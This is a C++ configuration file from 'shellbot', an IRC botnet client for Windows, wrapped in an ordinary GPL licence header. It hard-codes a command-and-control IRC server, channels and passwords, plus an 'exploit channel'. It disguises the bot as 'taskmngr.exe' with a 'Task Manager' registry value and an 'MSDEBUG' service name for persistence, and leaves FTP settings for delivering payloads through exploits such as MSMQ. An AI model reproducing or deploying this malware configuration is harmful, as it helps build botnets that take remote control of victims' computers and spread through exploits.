/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "vPOEb.h"

// shellbot config 
void CConnectIRC::Init(void)
{
	/* Cmd  Prefix */cConf.vPrefix = "x";
	/* Nick Prefix */cConf.vNick = "FUX-";
	/* Server DNS */cConf.vServer = "irc.bluehell.org";
	/* Server Port */cConf.vPort = 6667;
	/* Bot ID */cConf.vBotID = "FJAAJAH";
	/* Channel */cConf.vChan = "#fad";
	/* Exploit Chan */cConf.vExploitChan = "#og";
	/* Chan Pass */cConf.vChanPass = "wrtfx";
	/* Bot Pass */cConf.vBotPass = "hax";
	/* Nick!Ident@HostMask */ cConf.vMasterPattern = "*";
	/* Service Name */cConf.vSvcName = "MSDEBUG";
	/* Bot Filename */cConf.vFileName = "taskmngr.exe";
	/* Registry Value */cConf.vRegName = "Task Manager";
	
	/* For MSMQ and other CFTP exploits */
	/* FTP Host */cConf.vFTP_IP = "";
	/* FTP Port */cConf.vFTP_Port = 21;
	/* FTP User */cConf.vFTP_User = "";
	/* FTP Pass */cConf.vFTP_Pass = "";
	/* FTP File */cConf.vFTP_File = "";

	//! Don't change these core boolean values
	IRCRunning = false;
	noReconnect = false;
}

